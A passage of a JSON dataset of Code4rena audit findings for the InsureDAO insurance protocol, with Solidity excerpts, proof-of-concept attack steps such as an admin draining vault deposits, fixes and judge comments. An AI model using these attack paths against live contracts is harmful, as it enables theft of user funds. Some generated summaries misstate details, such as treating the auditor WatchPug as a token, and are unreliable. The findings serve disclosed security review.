severity](https://github.com/code-423n4/2022-01-insure-findings/issues/269)** \n\n**[oishun1112 (Insure) resolved](https://github.com/code-423n4/2022-01-insure-findings/issues/269)**\n\n\n",
      "summary": "\nThe bug report discusses a problem with the conversion between the amount of shares and the amount of underlying tokens in the code for the Insure project. This issue causes a loss of precision, resulting in incorrect calculations and transactions being reverted. The report includes a proof of concept and outlines the impact of the bug, which can cause funds to be frozen and result in unfair distribution of compensation. The recommendation is to make a change to the code to resolve the issue. The bug has been confirmed and resolved by the project team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/269",
      "tags": [],
      "finders": []
    },
    {
      "id": "42432",
      "title": "[H-07] Wrong design/implementation of permission control allows malicious/compromised Registry or Factory admin to steal funds from users' wallet balances",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\nThe current design/implementation allows a `market` address (registered on `registry`) to call `Vault#addValue()` and transfer tokens from an arbitrary address to a specified `_beneficiary` up the approved amount at any time, and the `_beneficiary` can withdraw the funds by calling `Vault#withdrawAllAttribution()` immediately.\n\nThis poses a very dangerous risk to all the users that approved their tokens to the Vault contracts (each one holds all users' allowances for that token).\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L52-L58>\n\n```solidity\nmodifier onlyMarket() {\n    require(\n        IRegistry(registry).isListed(msg.sender),\n        \"ERROR_ONLY_MARKET\"\n    );\n    _;\n}\n```\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L124-L140>\n\n```solidity\nfunction addValue(\n    uint256 _amount,\n    address _from,\n    address _beneficiary\n) external override onlyMarket returns (uint256 _attributions) {\n\n    if (totalAttributions == 0) {\n        _attributions = _amount;\n    } else {\n        uint256 _pool = valueAll();\n        _attributions = (_amount * totalAttributions) / _pool;\n    }\n    IERC20(token).safeTransferFrom(_from, address(this), _amount);\n    balance += _amount;\n    totalAttributions += _attributions;\n    attributions[_beneficiary] += _attributions;\n}\n```\n\nRegistry owner can call `Registry#supportMarket()` and mark an arbitrary address as a `market`.\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Registry.sol#L49-L60>\n\n```solidity\nfunction supportMarket(address _market) external override {\n    require(!markets[_market], \"ERROR: ALREADY_REGISTERED\");\n    require(\n        msg.sender == factory || msg.sender == ownership.owner(),\n        \"ERROR: UNAUTHORIZED_CALLER\"\n    );\n    require(_market != address(0), \"ERROR: ZERO_ADDRESS\");\n\n    allMarkets.push(_market);\n    markets[_market] = true;\n    emit NewMarketRegistered(_market);\n}\n```\n\nOr, the owner of the Factory can call `createMarket()` to add a malicous market contract via a custom template contract to the `markets` list.\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L214-L216>\n\n#### Proof of Concept\n\nA malicious/compromised Registry owner can:\n\n1.  Call `Registry#supportMarket()` and set `markets[attackerAddress]` to `true`;\n2.  Call `Vault#addValue(token.balanceOf(victimAddress), victimAddress, attackerAddress)` and transferring all the balanceOf victim's wallet to the vault, owned by `attackerAddress`.\n3.  Call `Vault#withdrawAllAttribution(attackerAddress)` and retrive the funds.\n\nThe malicious/compromised Registry owner can repeat the steps above for all the users who approved the Vault contract for all the Vault contracts.\n\nAs a result, the attacker can steal all the wallet balances of the tokens approved to the protocol.\n\n#### Root Cause\n\nImproper access control for using users' allowances.\n\n#### Recommendation\n\nConsider changing the design/implementation to make sure that the allowances approved by the users can only be used by themselves.\n\n\n**[oishun1112 (Insure) acknowledged and disagreed with severity](https://github.com/code-423n4/2022-01-insure-findings/issues/266):**\n > this is an issue only when ownership control has fail. This architecture is necessary to achieve simplicity of the code.\n> We assume ownership control works fine.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/266#issuecomment-1023323992):**\n > Agree with warden that the privilege addresses should not be able to use approvals in a way that rugs users funds. \n> \n> Based on the fact that we have seen many rug pulls in the space based on compromised \"owner\" keys, this is a valid attack path. \n> \n> `\n> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> `\n\n\n\n",
      "summary": "\nThe current design of the code allows a `market` address to transfer tokens from any address to a specified `_beneficiary` without their permission. This poses a risk to all users that have approved their tokens to the Vault contracts. The Registry owner or Factory owner can add a malicious market contract to the list and steal funds from users who have approved the Vault contract. This is due to improper access control for using user allowances. It is recommended to change the design to only allow users to use their own allowances. The severity of this issue is being disputed by the Insure team, but the judges agree that this is a valid attack path and could result in stolen funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/266",
      "tags": [],
      "finders": []
    },
    {
      "id": "42431",
      "title": "[H-05] backdoor in `withdrawRedundant`",
      "impact": "HIGH",
      "content": "_Submitted by cmichel, also found by camden, WatchPug, and Ruhum_\n\nThe `Vault.withdrawRedundant` has wrong logic that allows the admins to steal the underlying vault token.\n\n```solidity\nfunction withdrawRedundant(address _token, address _to)\n     external\n     override\n     onlyOwner\n{\n     if (\n          _token == address(token) &&\n          balance < IERC20(token).balanceOf(address(this))\n     ) {\n          uint256 _redundant = IERC20(token).balanceOf(address(this)) -\n               balance;\n          IERC20(token).safeTransfer(_to, _redundant);\n     } else if (IERC20(_token).balanceOf(address(this)) > 0) {\n          // @audit they can rug users. let's say balance == IERC20(token).balanceOf(address(this)) => first if false => transfers out everything\n          IERC20(_token).safeTransfer(\n               _to,\n               IERC20(_token).balanceOf(address(this))\n          );\n     }\n}\n```\n\n###### POC\n\n*   Vault deposits increase as `Vault.addValue` is called and the `balance` increases by `_amount` as well as the actual `IERC20(token).balanceOf(this)`. Note that `balance == IERC20(token).balanceOf(this)`\n*   Admins call `vault.withdrawRedundant(vault.token(), attacker)` which goes into the `else if` branch due to the balance inequality condition being `false`. It will transfer out all `vault.token()` amounts to the attacker.\n\n#### Impact\n\nThere's a backdoor in the `withdrawRedundant` that allows admins to steal all user deposits.\n\n#### Recommended Mitigation Steps\n\nI think the devs wanted this logic from the code instead:\n\n```solidity\nfunction withdrawRedundant(address _token, address _to)\n     external\n     override\n     onlyOwner\n{\n     if (\n          _token == address(token)\n     ) {\n          if (balance < IERC20(token).balanceOf(address(this))) {\n               uint256 _redundant = IERC20(token).balanceOf(address(this)) -\n                    balance;\n               IERC20(token).safeTransfer(_to, _redundant);\n          }\n     } else if (IERC20(_token).balanceOf(address(this)) > 0) {\n          IERC20(_token).safeTransfer(\n               _to,\n               IERC20(_token).balanceOf(address(this))\n          );\n     }\n}\n```\n\n**[oishun1112 (Insure) confirmed](https://github.com/code-423n4/2022-01-insure-findings/issues/252):**\n > similar to PVE03 (Peckshield audit)\n > We will create a PR and merge after we merge both audit/code4rena and audit/peckshield branches in the InsureDAO repository.\n\n\n",
      "summary": "\nThe bug report is about a coding error in the `Vault.withdrawRedundant` function that allows the admins to steal the underlying vault token. This bug was found by multiple users and can be exploited by depositing funds into the vault and then calling the `withdrawRedundant` function with the attacker's address. This can result in the admins being able to steal all user deposits. The recommended mitigation steps involve changing the logic of the function to prevent this backdoor from being exploited. This bug has been confirmed by the Insure team and they will be making the necessary changes to fix it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/252",
      "tags": [],
      "finders": []
    },
    {
      "id": "1314",
      "title": "[M-08] Unbounded iteration over all indexes (2)",
      "impact": "MEDIUM",
      "content": "_Submitted by Dravee, also found by robee, egjlmn1, danb, WatchPug, Fitraldys, and Ruhum_\n\nThe transactions could fail if the array get too big and the transaction would consume more gas than the block limit.\nThis will then result in a denial of service for the desired functionality and break core functionality.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L703>\n\n#### Tools Used\n\nVS Code\n\n#### Recommended Mitigation Steps\n\nKeep the array size small.\n\n**[oishun1112 (Insure) confirmed](https://github.com/code-423n4/2022-01-insure-findings/issues/352)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/352#issuecomment-1023645387):**\n > Upgrading to sev-2 as this will eventually affect the availability of the protocol as transactions revert. \n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a contract called PoolTemplate.sol. The vulnerability could cause transactions to fail if the array size gets too big, which would result in a denial of service for the desired functionality and break core functionality. The proof of concept for this bug can be found at https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L703. The tool used to identify this vulnerability was VS Code. The recommended mitigation step for this vulnerability is to keep the array size small.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/352",
      "tags": [],
      "finders": [
        "danb",
        "robee",
        "Dravee",
        "Ruhum",
        "WatchPug",
        "Fitraldys",
        "egjlmn1"
      ]
    },
    {
      "id": "1313",
      "title": "[M-07] requestWithdraw without obligation to withdraw allow underwriter to avoid payout",
      "impact": "MEDIUM",
      "content": "## Handle\n\ngzeon\n\n\n## Vulnerability details\n\n## Impact\nTo prevent withdrawal front-running, a lockup period is set between withdrawal request and withdrawal. However, there are no obligation to withdraw after the lockup period and the capital will keep earning premium during lockup. A strategy for underwriter is to keep requesting withdrawal every `lockup period` to keep their average lockup to `lockup period/2`. \n\n## Proof of Concept\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L279\n\nAssuming\n1) Reporting DAO vote last for 24 hours (according to docs) plus there will be delay between the hack and vote creation \n2) the `lockup period` is set to 86400 (24 hours) in the supplied test cases\nIt is very likely an underwriter can avoid payout by such strategy since their effective lockup would be 12 hours only. They will continue to earn yield in the pool and only require some extra gas cost for the `requestWithdraw` every 24 hours.\n\n## Recommended Mitigation Steps\nExtend the lockup period at least by a factor of 2 or force underwriter to withdraw after lockup period.",
      "summary": "\nThis bug report is about an issue with the lockup period set to prevent withdrawal front-running. This issue occurs when an underwriter requests a withdrawal every lockup period, which results in their average lockup period being reduced to half the lockup period. This means that the underwriter can avoid payout and continue to earn yield in the pool, only requiring additional gas costs for the withdrawal request every 24 hours. To mitigate this issue, it is recommended to extend the lockup period by at least a factor of two, or to force underwriters to withdraw after the lockup period.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/295",
      "tags": [],
      "finders": [
        "gzeon"
      ]
    },
    {
      "id": "1312",
      "title": "[M-06] Index compensate is 0 when totalLiquidity() is enough to cover the whole amount",
      "impact": "MEDIUM",
      "content": "_Submitted by pauliax_\n\nIn IndexTemplate, function compensate, When `\\_amount > \\_value`, and `<= totalLiquidity()`, the value of `\\_compensated` is not set, so it gets a default value of 0:\n\n```solidity\nif (_value >= _amount) {\n    ...\n    _compensated = _amount;\n} else {\n    ...\n    if (totalLiquidity() < _amount) {\n        ...\n        _compensated = _value + _cds;\n    }\n    vault.offsetDebt(_compensated, msg.sender);\n}\n```\n\nBut nevertheless, in both cases, it calls `vault.offsetDebt`, even when the`\\_compensated` is 0 (no else block).\n\n#### Recommended Mitigation Steps\n\nI think, in this case, it should try to redeem the premium (withdrawCredit?) to cover the whole amount, but I am not sure about the intentions as I didn't have enough time to understand this protocol in depth.\n\n\n**[oishun1112 (Insure) confirmed and resolved](https://github.com/code-423n4/2022-01-insure-findings/issues/354):**\n > Right.\n> totalLiquidity = underlyingValue + pendingPremium.\n> \n> I will discuss how to fix this issue with my team\n\n",
      "summary": "\nThis bug report is about the IndexTemplate function compensate. When _amount is greater than _value and less than or equal to totalLiquidity(), the value of _compensated is not set, resulting in a default value of 0. Despite this, in both cases, vault.offsetDebt is called, even when the _compensated is 0. The recommended mitigation step is to try to redeem the premium (withdrawCredit?) to cover the whole amount, although the intentions of this protocol are not clear due to lack of time to understand it in depth.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/354",
      "tags": [],
      "finders": [
        "pauliax"
      ]
    },
    {
      "id": "1311",
      "title": "[M-05] Vault.sol Tokens with fee on transfer are not supported",
      "impact": "MEDIUM",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nThere are ERC20 tokens that charge fee for every `transfer()` / `transferFrom()`.\n\n`Vault.sol#addValue()` assumes that the received amount is the same as the transfer amount, and uses it to calculate attributions, balance amounts, etc. While the actual transferred amount can be lower for those tokens.\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L124-L140\n\n```solidity\nfunction addValue(\n    uint256 _amount,\n    address _from,\n    address _beneficiary\n) external override onlyMarket returns (uint256 _attributions) {\n\n    if (totalAttributions == 0) {\n        _attributions = _amount;\n    } else {\n        uint256 _pool = valueAll();\n        _attributions = (_amount * totalAttributions) / _pool;\n    }\n    IERC20(token).safeTransferFrom(_from, address(this), _amount);\n    balance += _amount;\n    totalAttributions += _attributions;\n    attributions[_beneficiary] += _attributions;\n}\n```\n\n### Recommendation\n\nConsider comparing before and after balance to get the actual transferred amount.",
      "summary": "\nThis bug report is about an issue with the WatchPug ERC20 tokens, which charge a fee for every `transfer()` or `transferFrom()` function. The problem is that the `Vault.sol#addValue()` assumes that the received amount is the same as the transfer amount, but the actual transferred amount can be lower due to the fees.\n\nThe recommendation is to compare the before and after balance to get the actual transferred amount. This will help ensure that the correct amount is taken into account when calculating attributions, balance amounts, etc.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/236",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "pmerkleplant",
        "cmichel",
        "Dravee",
        "Ruhum",
        "WatchPug"
      ]
    },
    {
      "id": "1310",
      "title": "[M-04] System Debt Is Not Handled When Insurance Pools Become Insolvent",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\nIf an incident has occurred where an insurance policy is to be redeemed. The market is put into the `MarketStatus.Payingout` mode where the `_insurance.insured` account is allowed to redeem their cover and receive a payout amount. Upon paying out the insurance cover, any user is able to resume the market by calling `PoolTemplate.resume()`. This function will compensate the insurance pool if it is insolvent by querying `IndexTemplate.compensate()` which in turn queries `CDSTemplate.compensate()` to cover any shortage.\n\nIn the event none of these entities are able to cover the shortage in debt, the system accrues the debt. However, there is currently no mechanism to ensure when `transferDebt()` is called in `PoolTemplate.resume()`, the accrued system debt is paid off. Therefore, the system may incorrectly handle insolvency on an extreme edge case, generating system instability.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L691-L734>\n```solidity\nfunction resume() external {\n    require(\n        marketStatus == MarketStatus.Payingout &&\n            pendingEnd < block.timestamp,\n        \"ERROR: UNABLE_TO_RESUME\"\n    );\n\n    uint256 _debt = vault.debts(address(this));\n    uint256 _totalCredit = totalCredit;\n    uint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /\n        totalLiquidity();\n    uint256 _actualDeduction;\n    for (uint256 i = 0; i < indexList.length; i++) {\n        address _index = indexList[i];\n        uint256 _credit = indicies[_index].credit;\n        if (_credit > 0) {\n            uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /\n                _totalCredit;\n            uint256 _redeemAmount = _divCeil(\n                _deductionFromIndex,\n                _shareOfIndex\n            );\n            _actualDeduction += IIndexTemplate(_index).compensate(\n                _redeemAmount\n            );\n        }\n    }\n\n    uint256 _deductionFromPool = _debt -\n        _deductionFromIndex /\n        MAGIC_SCALE_1E6;\n    uint256 _shortage = _deductionFromIndex /\n        MAGIC_SCALE_1E6 -\n        _actualDeduction;\n\n    if (_deductionFromPool > 0) {\n        vault.offsetDebt(_deductionFromPool, address(this));\n    }\n\n    vault.transferDebt(_shortage);\n\n    marketStatus = MarketStatus.Trading;\n    emit MarketStatusChanged(MarketStatus.Trading);\n}\n```\n- <https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L421-L450>\n- <https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L248-L277>\n\n\n#### Recommended Mitigation Steps\n\nConsider devising a mechanism to ensure system debt is properly handled. After discussions with the sponsor, it seems that they will be implementing a way to mint `INSURE` tokens which will be used to cover the shortfall.\n\n**[oishun1112 (Insure) acknowledged](https://github.com/code-423n4/2022-01-insure-findings/issues/228)**\n > yes, PoolTemplate calls transferDebt() to make his debt to the system debt in case all Index and CDS layers couldn't cover the shortage.\n> In this case, we have to repay the system debt somehow since this is the situation that we over-lose money. One way is that someone calls repayDebt() and pay for it (not realistic at all). As we implement the way to payback, we are considering minting INSURE token or, other better mechanism.\n> \n > This is not developed yet, and acknowledged.\n\n\n",
      "summary": "\nThis bug report describes a vulnerability in an insurance policy redemption system. If an incident occurs where an insurance policy is to be redeemed, the market is put into the 'MarketStatus.Payingout' mode, allowing the '_insurance.insured' account to redeem their cover and receive a payout amount. However, there is currently no mechanism to ensure when 'transferDebt()' is called in 'PoolTemplate.resume()', the accrued system debt is paid off. This could lead to system instability in extreme edge cases.\n\nProof of concept code for the vulnerability is provided in the report. The recommended mitigation step is to devise a mechanism to ensure the system debt is properly handled. After discussions with the sponsor, it seems that they will be implementing a way to mint 'INSURE' tokens which will be used to cover the shortfall.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/228",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1309",
      "title": "[M-03] Signature replay",
      "impact": "MEDIUM",
      "content": "_Submitted by 0x1f8b_\n\nSignature replay in `PoolTemplate`.\n\n#### Proof of Concept\n\nThe `redeem` method of `PoolTemplate` verifies the data stored in `incident`, and the verification logic of this process is performed as following:\n```solidity\nrequire(\n    MerkleProof.verify(\n        _merkleProof,\n        _targets,\n        keccak256(\n            abi.encodePacked(_insurance.target, _insurance.insured)\n        )\n    ) ||\n        MerkleProof.verify(\n            _merkleProof,\n            _targets,\n            keccak256(abi.encodePacked(_insurance.target, address(0)))\n        ),\n    \"ERROR: INSURANCE_EXEMPTED\"\n);\n```\n\nAs can be seen, the only data related to the `_insurance` are`  target ` and `insured`, so as the incident has no relation with the`  Insurance `, apparently nothing prevents a user to call `insure` with high amounts, after receive the incident, the only thing that prevents this from being reused is that the owner creates the incident with an `_incidentTimestamp` from the past.\n\nSo if an owner create a incident from the future it's possible to create a new `insure` that could be reused by the same affected address.\n\nAnother lack of input verification that could facilitate this attack is the `_span=0` in the `insure` method.\n\n\n#### Recommended Mitigation Steps\n\nIt is mandatory to add a check in `applyCover` that`  _incidentTimestamp ` is less than the current date and the `span` argument is greater than 0 in the`  insure ` method.\n\n**[oishun1112 (Insure) confirmed and resolved, but disagreed with severity](https://github.com/code-423n4/2022-01-insure-findings/issues/184):**\n > agree on the _incidentTimestamp check.\n> disagree on span check since there already is\n> ```\n> require(\n>             parameters.getMinDate(msg.sender) <= _span,\n>             \"ERROR: INSURE_SPAN_BELOW_MIN\"\n>         );\n> ```\n> we are going to set default value of 1week for everyone\n\n**[oishun1112 (Insure) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/184#issuecomment-1015081369):**\n > we assume ownership control works fine.\n> this can lose money in-proper way, but not at risk since onlyOwner modifier applied.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/184#issuecomment-1023674000):**\n > going to leave this as 2 \n> \n> `\n> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> The external requirement here would be an incorrect timestamp from the owner which would cause assets to be at risk from the replay. \n\n**[oishun1112 (Insure) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/184#issuecomment-1027599600):**\n > there is\n> ```\n> _span >= getMinDate() \n> ```\n> so we don't implement _span > 0\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `PoolTemplate` of the system. The vulnerability allows for signature replay which can be exploited by a malicious user. The vulnerability is caused by the lack of verification of the data stored in `incident` and the lack of input verification of `_incidentTimestamp` and `span` argument in the `insure` method. The proof of concept was done manually. \n\nTo mitigate the vulnerability, it is recommended to add a check in `applyCover` that `_incidentTimestamp` is less than the current date and the `span` argument is greater than 0 in the `insure` method. This will ensure that the incident is not created with a timestamp from the past, and that the `span` argument is not set to 0.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/184",
      "tags": [
        "Replay Attack"
      ],
      "finders": [
        "0x1f8b"
      ]
    },
    {
      "id": "1308",
      "title": "[M-02] Owner can call applyCover multiple times in PoolTemplate.sol",
      "impact": "MEDIUM",
      "content": "## Handle\n\ncamden\n\n\n## Vulnerability details\n\n## Impact\nThe owner could potentially extend the insurance period indefinitely in the `applyCover` function without ever allowing the market to resume. This is because there is no check in `applyCover` to ensure that the market is in a `Trading` state.\n\nThis can also allow the owner to emit fraudulent `MarketStatusChanged` events.\n\n## Recommended Mitigation Steps\nRequire that the market be in a `Trading` state to allow another `applyCover` call.",
      "summary": "\nThis bug report is about a vulnerability in the `applyCover` function of a certain system. The vulnerability allows the owner of the system to extend the insurance period indefinitely without ever allowing the market to resume. This can also allow the owner to emit fraudulent `MarketStatusChanged` events. To mitigate this vulnerability, it is recommended to require that the market be in a `Trading` state to allow another `applyCover` call.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/160",
      "tags": [],
      "finders": [
        "camden"
      ]
    },
    {
      "id": "1307",
      "title": "[M-01] repayDebt in Vault.sol could DOS functionality for markets",
      "impact": "MEDIUM",
      "content": "_Submitted by p4st13r4_\n\nAny user can pay the debt for any borrower in `Vault.sol`, by using `repayDebt()`. This function allows anyone to repay any amount of borrowed value, up-to and including the `totalDebt` value; it works by setting the `debts[_target]` to zero, and decreasing `totalDebt` by the given amount, up to zero. However, all debts of the other borrowers are left untouched.\n\nIf a malicious (but generous) user were to repay the debt for all the borrowers, markets functionality regarding borrowing would be DOSed: the vault would try to decrease the debt of the market, successfully, but would fail to decrease `totalDebt` as it would result in an underflow\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L257>\n\n\n#### Recommended Mitigation Steps\n\nMake `repayDebt()` accept an amount up-to and including the value of the debt for the given borrower\n\n**[oishun1112 (Insure) confirmed](https://github.com/code-423n4/2022-01-insure-findings/issues/126):**\n > this needs to be specified how in more detail.\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `Vault.sol` smart contract. The `repayDebt()` function allows any user to pay the debt for any borrower, up-to and including the `totalDebt` value. If a malicious user were to repay the debt for all the borrowers, markets functionality regarding borrowing would be DOSed. The proof of concept to demonstrate this vulnerability can be found in the given link and the recommended mitigation step is to make `repayDebt()` accept an amount up-to and including the value of the debt for the given borrower.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/126",
      "tags": [],
      "finders": [
        "p4st13r4"
      ]
    },
    {
      "id": "1306",
      "title": "[H-13] Admin of the index pool can withdrawCredit() after applyCover() to avoid taking loss for the compensation paid for a certain pool",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nIn the current implementation, when an incident is reported for a certain pool, the index pool can still `withdrawCredit()` from the pool, which in the best interest of an index pool, the admin of the index pool is preferred to do so.\n\nThis allows the index pool to escape from the responsibility for the risks of invested pools.\n\nMaking the LPs of the pool take an unfair share of the responsibility.\n\n### PoC\n\n- Pool A `totalCredit` = 10,000\n- Pool A `rewardPerCredit` = 1\n\n1. [Index Pool 1] allocates 1,000 credits to Pool `A`:\n\n- `totalCredit` = 11,000\n- indicies[Index Pool 1] = 1,000\n\n2. After a while, Pool A `rewardPerCredit` has grown to `1.1`, and `applyCover()` has been called, [Index Pool 1] call `withdrawCredit()` get 100 premium\n\n- `totalCredit` = 10,000\n- indicies[Index Pool 1] = 0\n\n3. After `pendingEnd`, the pool `resume()`,[ Index Pool 1] will not be paying for the compensation since `credit` is 0.\n\nIn our case, [Index Pool 1] earned premium without paying for a part of the compensation.\n\n### Recommendation\n\nChange to:\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L416-L421\n\n```solidity\n    function withdrawCredit(uint256 _credit)\n        external\n        override\n        returns (uint256 _pending)\n    {\n        require(\n            marketStatus == MarketStatus.Trading,\n            \"ERROR: WITHDRAW_CREDIT_BAD_CONDITIONS\"\n        );\n        IndexInfo storage _index = indicies[msg.sender];\n```",
      "summary": "\nThis bug report is about WatchPug, a pool that allows users to invest in various pools. The vulnerability in the current implementation is that when an incident is reported for a certain pool, the index pool can still withdraw credit from the pool, which is not in the best interest of the pool. This allows the index pool to escape from the responsibility for the risks of invested pools, making the LPs of the pool take an unfair share of the responsibility. \n\nA proof of concept (PoC) was provided to demonstrate the vulnerability. It showed that if the reward per credit of a pool increases, an index pool can call withdrawCredit and get a premium without paying for a part of the compensation.\n\nThe recommendation provided is to change the code in PoolTemplate.sol on lines 416-421. This code change should prevent the index pool from withdrawing credit from the pool without paying for a part of the compensation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/281",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1305",
      "title": "[H-12] IndexTemplate.sol Wrong implementation allows lp of the index pool to resume a locked PayingOut pool and escape the responsibility for the compensation",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nBased on the context, the system intends to lock all the lps during PayingOut period.\n\nHowever, the current implementation allows anyone, including LPs to call `resume()` and unlock the index pool.\n\nIt allows a malicious LP to escape the responsibility for the compensation, at the expense of other LPs paying more than expected.\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L459-L471\n\n```solidity\nfunction resume() external override {\n    uint256 _poolLength = poolList.length;\n\n    for (uint256 i = 0; i < _poolLength; i++) {\n        require(\n            IPoolTemplate(poolList[i]).paused() == false,\n            \"ERROR: POOL_IS_PAUSED\"\n        );\n    }\n\n    locked = false;\n    emit Resumed();\n}\n```\n\n## Recommendation\n\nChange to:\n\n ```solidity\nfunction resume() external override {\n    uint256 _poolLength = poolList.length;\n\n    for (uint256 i = 0; i < _poolLength; i++) {\n        require(\n            IPoolTemplate(poolList[i]).marketStatus() == MarketStatus.Trading,\n            \"ERROR: POOL_IS_PAYINGOUT\"\n        );\n    }\n\n    locked = false;\n    emit Resumed();\n}\n```",
      "summary": "\nThis bug report is about a vulnerability in the WatchPug system. The system is intended to lock all the lps (liquidity providers) during PayingOut period. However, the current implementation allows anyone, including LPs to call `resume()` and unlock the index pool. This allows a malicious LP to escape the responsibility for the compensation, at the expense of other LPs paying more than expected. The recommendation is to change the code of the `resume()` function, so that it requires the pool to be in the Trading status instead of the Paused status. This will ensure that the pool is not unlocked during the PayingOut period, and malicious LPs cannot escape their responsibilities.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/278",
      "tags": [],
      "finders": [
        "WatchPug",
        "leastwood"
      ]
    },
    {
      "id": "1304",
      "title": "[H-11] PoolTemplate.sol#resume() Wrong implementation of resume() will compensate overmuch redeem amount from index pools",
      "impact": "HIGH",
